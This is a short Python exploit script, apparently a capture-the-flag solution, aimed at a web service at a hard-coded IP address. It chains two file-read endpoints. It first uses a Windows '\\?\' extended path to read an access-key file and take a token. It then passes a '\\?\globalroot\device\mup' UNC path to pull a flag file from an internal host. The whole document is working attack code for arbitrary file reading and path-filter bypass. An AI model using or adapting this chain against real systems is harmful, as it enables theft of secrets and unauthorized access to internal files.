import requests
import json

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    # We know this payload works
    path = r"\\?\C:\token\access_key.txt"
    url = f"{BASE_URL}/api/diag/read"
    params = {"path": path}
    try:
        print(f"[*] Getting token with path: {path}")
        r = requests.get(url, params=params, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                token = data.get("token")
                print(f"[+] Got Token: {token}")
                return token
    except Exception as e:
        print(f"[!] Error getting token: {e}")
    return None

def check_stage2(token, path):
    url = f"{BASE_URL}/api/export/read"
    params = {"path": path, "token": token}
    try:
        print(f"[*] Stage 2 - Trying path: {path} with token: {token[:20]}...")
        r = requests.get(url, params=params, timeout=5)
        print(f"[*] Status Code: {r.status_code}")
        print(f"[*] Response: {r.text}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    t = get_token()
    check_stage2(t, r"\\?\globalroot\device\mup\172.20.0.10\backup\flag.txt")
